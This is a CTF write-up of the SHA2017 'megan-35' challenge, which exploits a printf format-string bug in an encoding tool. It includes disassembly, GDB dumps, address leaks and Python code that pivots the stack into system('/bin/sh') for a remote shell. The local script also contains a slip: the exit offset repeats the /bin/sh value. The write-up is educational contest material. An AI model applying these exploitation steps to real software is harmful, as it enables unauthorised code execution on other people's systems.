# megan-35
##### Brad Daniels -- USF Whitehatter's Computer Security Club
##### pwning -- 200 points
## Description

We created our own Megan-35 decoding tool, feel free to test it. System is running Ubuntu 16.04, ASLR is disabled.

`nc megan35.stillhackinganyway.nl 3535`

## Files
[megan-35](https://github.com/WCSC/writeups/raw/master/sha2017/megan-35/megan-35)

[libc](https://github.com/WCSC/writeups/raw/master/sha2017/megan-35/libc.so.6)

You can take a peek at my solution here: 
[pwnMegan.py](https://github.com/WCSC/writeups/blob/master/sha2017/megan-35/pwnMegan.py)

## Solution

#### Initial Inspection
Lets do some basic analysis of the file. 
```shell_session
ctf@brad$ file megan-35
megan-35: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), 
 dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, 
 BuildID[sha1]=a59d9ecb21afef14e8d1345eaca94f5d66acc697, stripped
```

```shell_session
ctf@brad$ checksec megan-35
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

A stack canary was found, so buffer overflows won't work for overwriting a return address. The program also does bound checking as we'll see later on.

NX is enabled, so we can't execute shellcode we inject onto the stack. 

It wasn't compiled with PIE, so if ASLR was enabled on the server, which the description told us it wasn't, some memory addresses would not be randomized. 

Ok, lets run it and see what it does.
```shell_session
ctf@brad$ ./megan-35
Decrypt your text with the MEGAN-35 encryption.
aaaa
[1m%
ctf@brad$ ./megan-35
Decrypt your text with the MEGAN-35 encryption.
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[1m%
```
So it takes an input and returns... something. 

Lets dig deeper!

#### Disassembly
I used Binary Ninja to disassemble the binary. Here's a brief breakdown. 

Print the "Decrypt your text..." message: 

```
 80484fc:       89 df                   mov    edi,ebx
 80484fe:       68 c8 88 04 08          push   0x80488c8
 8048503:       65 a1 14 00 00 00       mov    eax,gs:0x14
 8048509:       89 45 e4                mov    DWORD PTR [ebp-0x1c],eax
 804850c:       31 c0                   xor    eax,eax
 804850e:       e8 9d ff ff ff          call   80484b0 <puts@plt>
 8048513:       58                      pop    eax
 8048514:       ff 35 44 a0 04 08       push   DWORD PTR ds:0x804a044
 804851a:       e8 31 ff ff ff          call   8048450 <fflush@plt>
 804851f:       83 c4 0c                add    esp,0xc
```

 Get 255 bytes of input with `fgets`:
```
 8048522:       ff 35 40 a0 04 08       push   DWORD PTR ds:0x804a040
 8048528:       68 ff 00 00 00          push   0xff
 804852d:       53                      push   ebx
 804852e:       e8 2d ff ff ff          call   8048460 <fgets@plt>
 8048533:       31 c0                   xor    eax,eax
 8048535:       83 c9 ff                or     ecx,0xffffffff
 8048538:       f2 ae                   repnz scas al,BYTE PTR es:[edi]
 804853a:       5a                      pop    edx
 804853b:       f7 d1                   not    ecx
 804853d:       5f                      pop    edi
 804853e:       49                      dec    ecx
```

 Call weird function:
```
 804853f:       51                      push   ecx
 8048540:       53                      push   ebx
 8048541:       8d 9d e4 fe ff ff       lea    ebx,[ebp-0x11c]
 8048547:       e8 1f 01 00 00          call   804866b <__libc_start_main@plt+0x1ab>
 804854c:       5a                      pop    edx
 804854d:       59                      pop    ecx
```

 Load output of weird function and call `printf` on it. Interesting!

 ```
 804854e:       50                      push   eax
 804854f:       53                      push   ebx
 8048550:       e8 2b ff ff ff          call   8048480 <strcpy@plt>
 8048555:       89 1c 24                mov    DWORD PTR [esp],ebx
 8048558:       e8 e3 fe ff ff          call   8048440 <printf@plt>
 804855d:       8b 55 e4                mov    edx,DWORD PTR [ebp-0x1c]
 ``` 

 Check stack canary. The input of `fgets` is bound checked and the stack looks big enough to hold 255+ bytes, so this should never get tripped. 

 If canary is intact, it loads a new ESP from a value on the stack and returns. Interesting! 

 ```
 8048560:       65 33 15 14 00 00 00    xor    edx,DWORD PTR gs:0x14
 8048567:       74 05                   je     804856e <__libc_start_main@plt+0xae>
 8048569:       e8 02 ff ff ff          call   8048470 <__stack_chk_fail@plt>
 804856e:       8d 65 f4                lea    esp,[ebp-0xc]
 8048571:       31 c0                   xor    eax,eax
 8048573:       59                      pop    ecx
 8048574:       5b                      pop    ebx
 8048575:       5f                      pop    edi
 8048576:       5d                      pop    ebp
 8048577:       8d 61 fc                lea    esp,[ecx-0x4]
 804857a:       c3                      ret
 ```

 So this looks like a pretty basic format string vulnerability. We just need to get exploit format string into printf and we should be able to overwrite the stack address it loads before the function returns, and do whatever we want! 

#### Spotting the Vulnerability

The program seems to do some kind of transform on the user input and feed the output to the `printf` function.

Feeding user input directly to `printf` without a format string is a big vulnerability. It allows an attacker to read or write to arbitrary memory addresses. 

See my [Beginner's Guide to Format String Vulns](https://braddaniels.org) for more info. 

So we have to reverse the transform, get the data we want into `printf`, and can then overwrite the ESP value that's loaded from the stack at `0x8048573`, then we gain control of EIP!


#### megan-35

Let's turn our attention to the transform that's called on the user input.

Unfortunately, I spent more time than I care to admit reverse engineering this function, thinking it was some custom encoding that was desinged for the CTF. After translating the x86 into Python, I did some Googling and found that megan-35 is an existing encoding, a base64 variant! Oh well.

I found [this]() Python file that did the encoding/decoding for me, and just copied and pasted that into my exploit script.

#### Local Exploit

This is what we want our stack to look like when `0x804857a: ret` is called:

```
-----------------
|    system     | <- ESP
-----------------
|     exit      | <- ESP + 0x4
-----------------
|    /bin/sh    | <- ESP + 0x8
-----------------
|   megan-35    | <- ESP + 0xc
|    encoded    |
| format string |
-----------------
```

So we need to overwrite the value that is popped off the stack into ECX with the address of `exit`.
```
 8048573:       59                      pop    ecx # ecx == newESP + 0x4
 8048574:       5b                      pop    ebx
 8048575:       5f                      pop    edi
 8048576:       5d                      pop    ebp
 8048577:       8d 61 fc                lea    esp,[ecx-0x4]
 804857a:       c3                      ret
```
First lets find the offsets of the `system` and `exit` functions inside the libc we're running.
```shell_session
brad@ctf$ objdump -d /lib/i386-linux-gnu/libc.so.6 | grep system@@GLIBC
0003b060 <__libc_system@@GLIBC_PRIVATE>:
   3b074:       74 0a                   je     3b080 <__libc_system@@GLIBC_PRIVATE+0x20>
```
And find the offset of our `/bin/sh` string that is conveniently located in libc:

```shell_session
brad@ctf$ strings --radix=x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
 15fa0f /bin/sh
```

So our Python exploit script is now looking like this:
```python
# mine
libc = 0xf7ddc000
system = 0x3b060
exit = 0x15fa0f
binsh =  0x15fa0f 

# Placeholder where and what
where = 0xffffffff # Memory we need to overwrite
what = 0xffffffff # Data we want at the where address

# Pack transforms the ints into little-endian byte strings
payload = struct.pack("<I", where)
payload += struct.pack("<", where+1)
payload += struct.pack("<", where+2)
payload += struct.pack("<", where+3)
payload += struct.pack("<I", libc+system) 
payload += struct.pack("<I", libc+exit)
payload += struct.pack("<I", libc+binsh)

enc_payload = "placeholder" # Our format string goes here
enc_payload = encode(megan35, enc_payload) # Encode format string in megan-35

p = process("megan-35")
print(p.recv())
p.send(payload + enc_payload + "\n")
print(p.recv())
```

Lets fire up GDB, attach it to the megan-35 process our exploit script starts, set breakpoints on `call printf`, `pop ecx`, and `ret` and figure out some stack addresses!

```
gdb-peda$ c
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0xffffcf2c --> 0x75bf0f71
ECX: 0xff
EDX: 0x0
ESI: 0x1
EDI: 0xff
EBP: 0xffffd048 --> 0x0
ESP: 0xffffd03c --> 0xffffd060 --> 0x1
EIP: 0x8048573 (pop    ecx)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048569:   call   0x8048470 <__stack_chk_fail@plt>
   0x804856e:   lea    esp,[ebp-0xc]
   0x8048571:   xor    eax,eax
=> 0x8048573:   pop    ecx
   0x8048574:   pop    ebx
   0x8048575:   pop    edi
   0x8048576:   pop    ebp
   0x8048577:   lea    esp,[ecx-0x4]
[------------------------------------stack-------------------------------------]
0000| 0xffffd03c --> 0xffffd060 --> 0x1
0004| 0xffffd040 --> 0x0
0008| 0xffffd044 --> 0xf7f92000 --> 0x1b5db0
0012| 0xffffd048 --> 0x0
0016| 0xffffd04c --> 0xf7df4276 (<__libc_start_main+246>:       add    esp,0x10)
0020| 0xffffd050 --> 0x1
0024| 0xffffd054 --> 0xf7f92000 --> 0x1b5db0
0028| 0xffffd058 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x08048573 in ?? ()
gdb-peda$
```

So `0xffffd03c` is the value that gets loaded into ECX, and we need to overwrite it with the address of "exit" on our new stack frame, so that when `lea esp,[ecx-0x4]` gets called, our pointer to `system` in libc is on top of the stack.

```python
where = 0xffffd03c # Memory we need to overwrite
what = 0xffffffff # Data we want at the where address
```



We can use PEDA's `context stack` command to get a pretty printout of the stack when `printf` is called.
```
gdb-peda$ context stack 16
tack-------------------------------------]
0000| 0xffffce10 --> 0xffffcf2c --> 0x75bf0f71
0004| 0xffffce14 --> 0x804c418 --> 0x75bf0f71
0008| 0xffffce18 --> 0xf7f925a0 --> 0xfbad2088
0012| 0xffffce1c --> 0xf7feffda (<malloc+26>:   add    esp,0x18)
0016| 0xffffce20 --> 0xf7de2028 --> 0x4c73 ('sL')
0020| 0xffffce24 --> 0xf7fd3858 --> 0xf7ddc000 --> 0x464c457f
0024| 0xffffce28 --> 0xf7ffd000 --> 0x23f3c
0028| 0xffffce2c --> 0xffffd05c --> 0xf7df4276 (<__libc_start_main+246>:        add    esp,0x10)
0032| 0xffffce30 --> 0xffffd05d --> 0x1f7df42
0036| 0xffffce34 --> 0xffffd05e --> 0x1f7df
0040| 0xffffce38 --> 0xffffd05f --> 0x1f7
0044| 0xffffce3c --> 0xf7e17060 (<system>:      sub    esp,0xc)
0048| 0xffffce40 --> 0xf7e0aaf0 (<exit>:        call   0xf7eff629)
0052| 0xffffce44 --> 0xf7f3ba0f ("/bin/sh")
0056| 0xffffce48 ("mLrXiwf4lwr/jhN5\n")
0060| 0xffffce4c ("iwf4lwr/jhN5\n")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
gdb-peda$
```

Our next step is to craft the format string that will overwrite the where address with our data. 

[Pwntools](https://github.com/Gallopsled/pwntools) provides some [helpful tools](http://python3-pwntools.readthedocs.io/en/latest/fmtstr.html) to automate this process, but they won't work well for this challenge since some of the input needs to be encoded in megan-35. Plus it's more fun to make our own!

Like I explained in my [Beginner's Guide to Format String Vulns](https://braddaniels.org), we can overwrite abritrary memory by putting the target addresses on the stack, and using the variable selector specifier `$` to write to the address with the width specifier and `%n`.

Since we have several things being put on the stack before our format string, we need to calculate the total length of characters printed so far and craft our width specifiers accordingly. 

I should note that I chose to do this in four seperate writes. During the CTF I attempted to do it in two two-byte writes, but it kept segfaulting. I could have been doing something else wrong though.

Watch out for NULL bytes in the encoded payload! You might have to do a total of 5 writes like I did to avoid a NULL byte.

```python
pl = len(payload)*3/4
mask = 0xff
newByte1 = ((what&mask) - pl) & mask
pl += newByte1
newByte2 = (((what&(mask<<8))>>8) - pl) & mask
pl += newByte2
newByte3 = (((what&(mask<<16))>>16) - pl) & mask

newByte4 = 0x01
newByte5 = 0xff
enc_payload = ""
enc_payload += "%" + str(newByte1) + "c%7$hhn" 
enc_payload += "%" + str(newByte2) + "c%8$hhn"
enc_payload += "%" + str(newByte3) + "c%9$hhn"
enc_payload += "%" + str(newByte4) + "c%10$hhn"
enc_payload += "%" + str(newByte5) + "c%10$hhn"
```

Now that the length of our payload is settled, we can figure out our new ESP address, the *what*. So we break GDB at the `call printf` and copy the address of the `system` pointer we inserted and add it to our exploit script. Remember to increment it by four so when `lea [ecx-0x4]` runs the stack will be in the right place.

```python
where = 0xffffd03c # Memory we need to overwrite
what = 0xffffce3c # Data we want at the where address
what += 4
```

#### Remote Exploit

Once it worked locally, I turned my attention to the remote server. We were told that ASLR is off which is helpful. ASLR without PIE on 32-bit systems isn't that great anyway, and can be easily brute forced. 

First let's gather the offsets from the libc they provided us, just like we did on ours. Be really careful here! I made a mistake copying the `system` offset into my file and wasn't actually able to complete this challenge until after the competition ended! Take my word for it, it's very upsetting to lose all those points over something so trivial! 

Use a `printf` arbitrary read attack to read from the GOT and calculate where their libc is loaded.
```python
#mem leak
payload = struct.pack("<I",0x804a000) + payload[4:] 
enc_payload = "%x %x %x %x %x %x asdf%s"
enc_payload = encode(megan35, enc_payload)
```

Then analyze their libc in objdump to figure out the offsets.

```python
# theirs
libc = 0xf7e19000
systemOffset = 0x3a940
binsh = 0x15900b
exit = 0x2e7b0
```

Next we need to leak some memory to calculate how far their stack is offset from our local stack. 

I crafted a `printf` stack read attack and dumped values off the stack until I found some stack addresses to compare to my locally running megan-35's stack. I calculated their stack to be offset by `+0xd50`.

```python
where = 0xffffd03c # Memory we need to overwrite
where += 0xd50
what = 0xffffce3c # Data we want at the where address
what += 4
```




#### Flag

Finally, we run our attack on the remote server, and get the flag! 

```
[*] Switching to interactive mode
$ cat flag
flag{43eb404b714b8d22e1168775eba1669c}
$
```
